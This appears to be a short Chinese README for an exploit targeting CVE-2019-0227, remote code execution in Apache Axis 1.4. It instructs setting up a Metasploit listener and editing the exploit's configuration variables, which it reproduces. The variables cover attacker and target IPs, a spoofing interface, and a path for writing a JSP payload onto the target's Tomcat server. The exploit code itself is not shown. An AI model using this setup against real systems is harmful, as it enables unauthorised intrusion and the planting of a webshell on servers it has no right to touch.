# cve-2019-0227
apache axis1.4远程代码执行漏洞
需要在本机msf设置监听，另外需要修改代码24-30行处

＃您需要更改这些变量以匹配您的配置
myip =  “ 192.168.0.117 ”  ＃您机器的IP
target =  “ 192.168.0.102 ”  ＃目标IP
网关=  “ 192.168.0.1 ”  ＃默认网关
targetport =  “ 8080 ”  ＃目标运行轴的端口（可能是8080）
pathtoaxis =  “ http://192.168.0.102:8080/axis ”  ＃这可以是自定义的视轴安装，但是这是默认
spoofinterface =  “ eth0 ”  ＃伪造的接口
jspwritepath =  “ webapps \\ axis \\ exploit.jsp ”  ＃在目标上写入JSP有效负载的相对路径这是Tomcat安装的默认路径

